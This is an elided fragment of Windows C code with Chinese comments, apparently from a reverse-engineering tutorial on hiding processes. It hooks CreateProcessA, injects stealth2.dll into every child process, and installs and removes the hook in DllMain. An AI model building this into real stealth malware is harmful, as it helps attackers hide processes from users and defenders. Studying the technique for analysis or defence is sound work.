...
)
{
    ...
    pFunc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateProcessA");//调用原始API
    ...
    if( bRet )//向生成的子进程注入stealth2.dll
        InjectDll2(lpProcessInformation->hProcess, STR_MODULE_NAME);

    hook_by_code("kernel32.dll", "CreateProcessA",
                 (PROC)NewCreateProcessA, g_pOrgCPA);//注入
...
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    ...
    p = strrchr(szCurProc, '\\');
    if( (p != NULL) && !_stricmp(p+1, "HideProc2.exe") )//不注入HideProc2.exe进程中
        return TRUE;
    ...
    switch( fdwReason )
    {
        case DLL_PROCESS_ATTACH : //hook如下函数
            hook_by_code("kernel32.dll", "CreateProcessA",
        ...
        case DLL_PROCESS_DETACH ://卸载如下函数
